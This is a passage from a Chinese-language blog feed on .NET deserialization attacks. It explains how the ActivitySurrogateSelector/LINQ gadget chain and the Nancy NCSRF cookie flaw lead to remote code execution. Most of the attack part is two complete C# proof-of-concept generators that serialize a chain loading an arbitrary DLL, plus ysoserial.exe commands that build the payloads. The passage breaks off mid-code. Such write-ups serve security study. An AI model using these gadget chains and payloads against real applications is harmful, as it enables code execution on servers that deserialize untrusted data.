src="../images/image-20240304150839810.png" alt="image-20240304150839810"></p><p>他会返回一个Enumerable迭代对象当做查询结果。并且LINQ有一个特性叫做延迟执行，也就是说当语句执行到<code>var q1 = from s in words where s.ToLower().Contains(&#39;o&#39;) select s;</code><br>这一步的时候，它并不会执行select语句，它需要被当做enumerable对象的时候会自动触发，也就是上述demo中的<code>foreach (var item in q1)</code><br>结合上面说的攻击面扩大，我们可以反序列化LINQ对象进行命令执行，基本的触发链如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">    List&lt;byte[]&gt; data = new List&lt;byte[]&gt;();</span><br><span class="line">    data.Add(File.ReadAllBytes(&quot;C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\ExpClass.dll&quot;));</span><br><span class="line">    var e1 = data.Select(Assembly.Load);</span><br><span class="line">    Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt; map_type = (Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;)Delegate.CreateDelegate(typeof(Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;), typeof(Assembly).GetMethod(&quot;GetTypes&quot;));</span><br><span class="line">    var e2 = e1.SelectMany(map_type);</span><br><span class="line">    var e3 = e2.Select(Activator.CreateInstance);</span><br><span class="line">    foreach (var o in e3)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终执行到CreateInstance里面实例化任意类，实例化的话就能执行dll中的构造函数了</p><p>最后执行还是靠 <code>foreach (var o in e3)&#123;Console.WriteLine(o);&#125;</code>  这个的话就是会执行上面的select语句</p><h3 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h3><p>ysoserial.net给出的调用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IEnumerable -&gt; PagedDataSource -&gt; ICollection</span><br><span class="line">ICollection -&gt; AggregateDictionary -&gt; IDictionary</span><br><span class="line">IDictionary -&gt; DesignerVerb -&gt; ToString</span><br></pre></td></tr></table></figure><p>最终都是会进行进入到这个遍历IEnumerable对象来触发的  我们挨个来来看</p><p>其中属性dataSource是IEnumerable类型，因此可以承接上终点的LINQ，又因为PagedDataSource是ICollection的子类，因此可以往上强转，最终到了<code>AggregateDictionary</code></p><p><img src="../images/image-20240304170005184.png" alt="image-20240304170005184"></p><p>这里进行了遍历  触发了Enumberable  那么我们只要将_dictionaries参数赋值为PagedDataSource  那么就可以连起来了  <code>AggregateDictionary</code>继承IDictionary，因此继续往上看。</p><p>  <img src="../images/image-20240304170515341.png" alt="image-20240304170515341"></p><p>这里把一些重点方法拿出来了。可以看到ToString的地方配合上Text字段的getter方法可以接上<code>AggregateDictionary</code>，我们只需要将properties设置为<code>AggregateDictionary</code>即可。因此最终来到了如何触发ToString方法上，这里Ysoserial中使用的是HashTable。</p><p>Hashtable在反序列化的时候会重新建key集合。引发异常的话就会触发ToString</p><p>最终POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Collections;</span><br><span class="line">using System.ComponentModel.Design;</span><br><span class="line">using System.Data;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Reflection;</span><br><span class="line">using System.Web.UI.WebControls;</span><br><span class="line">using System.Runtime.Serialization;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line"></span><br><span class="line">namespace ysoserial.Generators</span><br><span class="line">&#123;</span><br><span class="line">    public class MySurrogateSelector : SurrogateSelector</span><br><span class="line">    &#123;</span><br><span class="line">        public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector)</span><br><span class="line">        &#123;</span><br><span class="line">            selector = this;</span><br><span class="line">            if (!type.IsSerializable)</span><br><span class="line">            &#123;</span><br><span class="line">                Type t = Type.GetType(&quot;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;);</span><br><span class="line">                return (ISerializationSurrogate)Activator.CreateInstance(t);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return base.GetSurrogate(type, context, out selector);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">     [Serializable]</span><br><span class="line">    public class PayloadClass : ISerializable</span><br><span class="line">    &#123;</span><br><span class="line">        protected byte[] assemblyBytes;</span><br><span class="line">        protected int variant_number = 1;</span><br><span class="line">        public PayloadClass()</span><br><span class="line">        &#123;</span><br><span class="line">            this.assemblyBytes = File.ReadAllBytes(&quot;C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\ExpClass.dll&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        private IEnumerable&lt;TResult&gt; CreateWhereSelectEnumerableIterator&lt;TSource, TResult&gt;(IEnumerable&lt;TSource&gt; src, Func&lt;TSource, bool&gt; predicate, Func&lt;TSource, TResult&gt; selector)</span><br><span class="line">        &#123;</span><br><span class="line">            Type t = Assembly.Load(&quot;System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;)</span><br><span class="line">              .GetType(&quot;System.Linq.Enumerable+WhereSelectEnumerableIterator`2&quot;)</span><br><span class="line">              .MakeGenericType(typeof(TSource), typeof(TResult));</span><br><span class="line">            return t.GetConstructors()[0].Invoke(new object[] &#123; src, predicate, selector &#125;) as IEnumerable&lt;TResult&gt;;</span><br><span class="line">        &#125;</span><br><span class="line">        protected PayloadClass(SerializationInfo info, StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public List&lt;object&gt; GadgetChains()</span><br><span class="line">        &#123;</span><br><span class="line">            DesignerVerb verb = null;</span><br><span class="line">            Hashtable ht = null;</span><br><span class="line">            List&lt;object&gt; ls = null;</span><br><span class="line">            List&lt;byte[]&gt; data = new List&lt;byte[]&gt;();</span><br><span class="line">            data.Add(this.assemblyBytes);</span><br><span class="line">            var e1 = data.Select(Assembly.Load);</span><br><span class="line">            Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt; map_type = (Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;)Delegate.CreateDelegate(typeof(Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;), typeof(Assembly).GetMethod(&quot;GetTypes&quot;));</span><br><span class="line">            var e2 = e1.SelectMany(map_type);</span><br><span class="line">            var e3 = e2.Select(Activator.CreateInstance);</span><br><span class="line">            PagedDataSource pds = new PagedDataSource() &#123; DataSource = e3 &#125;;</span><br><span class="line">            IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType(&quot;System.Runtime.Remoting.Channels.AggregateDictionary&quot;), pds);</span><br><span class="line">            verb = new DesignerVerb(&quot;&quot;, null);</span><br><span class="line">            typeof(MenuCommand).GetField(&quot;properties&quot;, BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);</span><br><span class="line">            ls = new List&lt;object&gt;();</span><br><span class="line">            ls.Add(e1);</span><br><span class="line">            ls.Add(e2);</span><br><span class="line">            ls.Add(e3);</span><br><span class="line">            ls.Add(pds);</span><br><span class="line">            ls.Add(verb);</span><br><span class="line">            ls.Add(dict);</span><br><span class="line">            ht = new Hashtable();</span><br><span class="line">            ht.Add(verb, &quot;&quot;);</span><br><span class="line">            ht.Add(&quot;&quot;, &quot;&quot;);</span><br><span class="line">            FieldInfo fi_keys = ht.GetType().GetField(&quot;buckets&quot;, BindingFlags.NonPublic | BindingFlags.Instance);</span><br><span class="line">            Array keys = (Array)fi_keys.GetValue(ht);</span><br><span class="line">            FieldInfo fi_key = keys.GetType().GetElementType().GetField(&quot;key&quot;, BindingFlags.Public | BindingFlags.Instance);</span><br><span class="line">            for (int i = 0; i &lt; keys.Length; ++i)</span><br><span class="line">            &#123;</span><br><span class="line">                object bucket = keys.GetValue(i);</span><br><span class="line">                object key = fi_key.GetValue(bucket);</span><br><span class="line">                if (key is string)</span><br><span class="line">                &#123;</span><br><span class="line">                    fi_key.SetValue(bucket, verb);</span><br><span class="line">                    keys.SetValue(bucket, i);</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fi_keys.SetValue(ht, keys);</span><br><span class="line"></span><br><span class="line">            ls.Add(ht);</span><br><span class="line"></span><br><span class="line">            return ls;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public byte[] GadgetChainsToBinaryFormatter()</span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;object&gt; ls = GadgetChains();</span><br><span class="line">            MemoryStream stm = new MemoryStream();</span><br><span class="line">            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();</span><br><span class="line">            fmt.SurrogateSelector = new MySurrogateSelector();</span><br><span class="line">            fmt.Serialize(stm, ls);</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            return stm.ToArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void GetObjectData(SerializationInfo info, StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">            System.Diagnostics.Trace.WriteLine(&quot;In GetObjectData&quot;);</span><br><span class="line">            info.SetType(typeof(System.Windows.Forms.AxHost.State));</span><br><span class="line">            info.AddValue(&quot;PropertyBagBinary&quot;, GadgetChainsToBinaryFormatter());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public class Exp</span><br><span class="line">    &#123;</span><br><span class="line">        public static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            System.Configuration.ConfigurationManager.AppSettings.Set(&quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;, &quot;true&quot;);</span><br><span class="line"></span><br><span class="line">            PayloadClass payload = new PayloadClass();</span><br><span class="line">            using (MemoryStream memoryStream = new MemoryStream(payload.GadgetChainsToBinaryFormatter()))</span><br><span class="line">            &#123;</span><br><span class="line">                // 构建formatter</span><br><span class="line">                // SoapFormatter sp1 = new SoapFormatter();</span><br><span class="line">                // sp1.Serialize(memoryStream, payload);</span><br><span class="line">                memoryStream.Position = 0;</span><br><span class="line">                // var sp2=new SoapFormatter();</span><br><span class="line">                var bn=new BinaryFormatter();</span><br><span class="line">                bn.Deserialize(memoryStream);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240304170818822.png" alt="image-20240304170818822"></p><p>虽然也可以弹窗，但是这个payload会报错，在实战中可能会导致利用失败，为了避免这种情况，ysoserial选择了一种二次反序列化的做法。</p><h3 id="AxHost-State"><a href="#AxHost-State" class="headerlink" title="AxHost.State"></a>AxHost.State</h3><p><img src="../images/image-20240304171015417.png" alt="image-20240304171015417"></p><p>在反序列化的时候他会对PropertyBagBinary进行binary反序列化。</p><p><img src="../images/image-20240304171116749.png" alt="image-20240304171116749"></p><p>最主要的是这里还做了异常处理，就避免了异常发生。</p><p>最终poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Collections;</span><br><span class="line">using System.ComponentModel.Design;</span><br><span class="line">using System.Data;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Reflection;</span><br><span class="line">using System.Web.UI.WebControls;</span><br><span class="line">using System.Runtime.Serialization;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line">using NDesk.Options;</span><br><span class="line"></span><br><span class="line">namespace ysoserial.Generators</span><br><span class="line">&#123;</span><br><span class="line">    public class MySurrogateSelector : SurrogateSelector</span><br><span class="line">    &#123;</span><br><span class="line">        public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector)</span><br><span class="line">        &#123;</span><br><span class="line">            selector = this;</span><br><span class="line">            if (!type.IsSerializable)</span><br><span class="line">            &#123;</span><br><span class="line">                Type t = Type.GetType(&quot;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;);</span><br><span class="line">                return (ISerializationSurrogate)Activator.CreateInstance(t);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return base.GetSurrogate(type, context, out selector);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">     [Serializable]</span><br><span class="line">    public class PayloadClass : ISerializable</span><br><span class="line">    &#123;</span><br><span class="line">        protected byte[] assemblyBytes;</span><br><span class="line">        protected int variant_number = 1;</span><br><span class="line">        public PayloadClass()</span><br><span class="line">        &#123;</span><br><span class="line">            this.assemblyBytes = File.ReadAllBytes(&quot;E:\\CTFLearning\\开发学习\\CsharpLearning\\ExpClassa\\ExpClassa\\obj\\Debug\\ExpClassa.dll&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        private IEnumerable&lt;TResult&gt; CreateWhereSelectEnumerableIterator&lt;TSource, TResult&gt;(IEnumerable&lt;TSource&gt; src, Func&lt;TSource, bool&gt; predicate, Func&lt;TSource, TResult&gt; selector)</span><br><span class="line">        &#123;</span><br><span class="line">            Type t = Assembly.Load(&quot;System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;)</span><br><span class="line">              .GetType(&quot;System.Linq.Enumerable+WhereSelectEnumerableIterator`2&quot;)</span><br><span class="line">              .MakeGenericType(typeof(TSource), typeof(TResult));</span><br><span class="line">            return t.GetConstructors()[0].Invoke(new object[] &#123; src, predicate, selector &#125;) as IEnumerable&lt;TResult&gt;;</span><br><span class="line">        &#125;</span><br><span class="line">        protected PayloadClass(SerializationInfo info, StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public List&lt;object&gt; GadgetChains()</span><br><span class="line">        &#123;</span><br><span class="line">            DesignerVerb verb = null;</span><br><span class="line">            Hashtable ht = null;</span><br><span class="line">            List&lt;object&gt; ls = null;</span><br><span class="line">            List&lt;byte[]&gt; data = new List&lt;byte[]&gt;();</span><br><span class="line">            data.Add(this.assemblyBytes);</span><br><span class="line">            var e1 = data.Select(Assembly.Load);</span><br><span class="line">            Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt; map_type = (Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;)Delegate.CreateDelegate(typeof(Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;), typeof(Assembly).GetMethod(&quot;GetTypes&quot;));</span><br><span class="line">            var e2 = e1.SelectMany(map_type);</span><br><span class="line">            var e3 = e2.Select(Activator.CreateInstance);</span><br><span class="line">            PagedDataSource pds = new PagedDataSource() &#123; DataSource = e3 &#125;;</span><br><span class="line">            IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType(&quot;System.Runtime.Remoting.Channels.AggregateDictionary&quot;), pds);</span><br><span class="line">            verb = new DesignerVerb(&quot;&quot;, null);</span><br><span class="line">            typeof(MenuCommand).GetField(&quot;properties&quot;, BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);</span><br><span class="line">            ls = new List&lt;object&gt;();</span><br><span class="line">            ls.Add(e1);</span><br><span class="line">            ls.Add(e2);</span><br><span class="line">            ls.Add(e3);</span><br><span class="line">            ls.Add(pds);</span><br><span class="line">            ls.Add(verb);</span><br><span class="line">            ls.Add(dict);</span><br><span class="line">            ht = new Hashtable();</span><br><span class="line">            ht.Add(verb, &quot;&quot;);</span><br><span class="line">            ht.Add(&quot;&quot;, &quot;&quot;);</span><br><span class="line">            FieldInfo fi_keys = ht.GetType().GetField(&quot;buckets&quot;, BindingFlags.NonPublic | BindingFlags.Instance);</span><br><span class="line">            Array keys = (Array)fi_keys.GetValue(ht);</span><br><span class="line">            FieldInfo fi_key = keys.GetType().GetElementType().GetField(&quot;key&quot;, BindingFlags.Public | BindingFlags.Instance);</span><br><span class="line">            for (int i = 0; i &lt; keys.Length; ++i)</span><br><span class="line">            &#123;</span><br><span class="line">                object bucket = keys.GetValue(i);</span><br><span class="line">                object key = fi_key.GetValue(bucket);</span><br><span class="line">                if (key is string)</span><br><span class="line">                &#123;</span><br><span class="line">                    fi_key.SetValue(bucket, verb);</span><br><span class="line">                    keys.SetValue(bucket, i);</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fi_keys.SetValue(ht, keys);</span><br><span class="line"></span><br><span class="line">            ls.Add(ht);</span><br><span class="line"></span><br><span class="line">            return ls;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public byte[] GadgetChainsToBinaryFormatter()</span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;object&gt; ls = GadgetChains();</span><br><span class="line">            MemoryStream stm = new MemoryStream();</span><br><span class="line">            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();</span><br><span class="line">            fmt.SurrogateSelector = new MySurrogateSelector();</span><br><span class="line">            fmt.Serialize(stm, ls);</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            return stm.ToArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void GetObjectData(SerializationInfo info, StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">            System.Diagnostics.Trace.WriteLine(&quot;In GetObjectData&quot;);</span><br><span class="line">            info.SetType(typeof(System.Windows.Forms.AxHost.State));</span><br><span class="line">            info.AddValue(&quot;PropertyBagBinary&quot;, GadgetChainsToBinaryFormatter());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public class Exp</span><br><span class="line">    &#123;</span><br><span class="line">        public static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            System.Configuration.ConfigurationManager.AppSettings.Set(&quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;, &quot;true&quot;);</span><br><span class="line"></span><br><span class="line">            PayloadClass payload = new PayloadClass();</span><br><span class="line">            using (MemoryStream memoryStream = new MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                //构建formatter</span><br><span class="line">                SoapFormatter sp1 = new SoapFormatter();</span><br><span class="line">                sp1.Serialize(memoryStream, payload);</span><br><span class="line">                memoryStream.Position = 0;</span><br><span class="line">                var sp2=new SoapFormatter();</span><br><span class="line">                // var bn=new BinaryFormatter();</span><br><span class="line">                sp2.Deserialize(memoryStream);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ActivitySurrogateSelectorFromFile"><a href="#ActivitySurrogateSelectorFromFile" class="headerlink" title="ActivitySurrogateSelectorFromFile"></a>ActivitySurrogateSelectorFromFile</h2><p>就是动态控制dll文件生成payload恶意  yso已经帮我们实现了  其实就是省去了自己生成dll的过程和payload的过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -g ActivitySurrogateSelectorFromFile -f SoapFormatter -c &quot;ExpClass.cs;System.Windows.Forms.dll&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240304172144207.png" alt="image-20240304172144207"></p><p>不限于soapFormatter其他的matter也是可以执行的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/SoapFormatter.md&quot;&gt;https://github.com/Y4er/dotnet-deserialization/blob/m</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-04</title>
    <link href="https://ke1nys.github.io/posts/d491eeb8.html"/>
    <id>https://ke1nys.github.io/posts/d491eeb8.html</id>
    <published>2024-02-26T06:46:05.000Z</published>
    <updated>2024-02-26T13:03:06.151Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/Nancy.md">https://github.com/Y4er/dotnet-deserialization/blob/main/Nancy.md</a></p><h2 id="Nancy"><a href="#Nancy" class="headerlink" title="Nancy"></a>Nancy</h2><p>Nancy是一个轻量级web框架，其cookie中NCSRF字段使用binaryformatter进行序列化反序列化，造成rce。本文主要讲解其反序列化漏洞及ToolboxItemContainer攻击链。</p><p>直接从GitHub下载nancy的demo案例 <a href="https://github.com/NancyFx/Nancy.Demo.Samples">https://github.com/NancyFx/Nancy.Demo.Samples</a></p><p><img src="../images/image-20240226150317588.png" alt="image-20240226150317588"></p><p>这样就是运行成功了  </p><p><img src="../images/image-20240226202457157.png" alt="image-20240226202457157"></p><p>对这个cookie值进行base64解码后发现</p><p><img src="../images/image-20240226202608165.png" alt="image-20240226202608165"></p><p>发现是使用binaryformatter进行序列化存储cookie </p><p>用yso来生成payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -f binaryformatter -g ToolboxItemContainer -c calc</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240226202741516.png" alt="image-20240226202741516"></p><p><img src="../images/image-20240226202855166.png" alt="image-20240226202855166"></p><p>执行成功</p><p>反序列化点在  Nancy.DefaultObjectSerializer.Deserialize()</p><p><img src="../images/image-20240226204356468.png" alt="image-20240226204356468"></p><h2 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h2><p>这里这个yso的链子主要用的是<code>ToolboxItemContainer</code>这个链子</p><p><img src="../images/image-20240226204125307.png" alt="image-20240226204125307"></p><p>实现了ISerializable这个接口  那么等会其Objectdata方法肯定是会用到的</p><p>直接来看ToolboxItemSerializer的反序列化构造函数</p><p><img src="../images/image-20240226204509534.png" alt="image-20240226204509534"></p><p>这里获取序列化字节流  </p><p><img src="../images/image-20240226204726619.png" alt="image-20240226204726619"></p><p>然后在这使用<code>BinaryFormatter</code>进行反序列化  所以我们只需要给<code>ToolboxItemContainer</code>类中的<code>Stream</code>参数传入我们构造的恶意字节流就行了</p><p>这里就得用我们前面学到的<code>ObjectDataProvider</code>和<code>TextFormattingRunProperties</code>了</p><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 